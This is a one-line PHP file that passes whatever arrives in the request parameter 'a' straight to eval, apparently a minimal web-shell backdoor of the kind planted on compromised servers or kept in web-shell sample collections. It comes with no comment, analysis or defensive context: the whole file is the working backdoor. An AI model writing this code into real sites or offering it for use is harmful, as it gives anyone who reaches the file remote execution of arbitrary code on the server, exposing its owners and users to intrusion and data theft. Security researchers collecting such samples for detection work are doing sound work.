<?php 
eval($_REQUEST[a]);
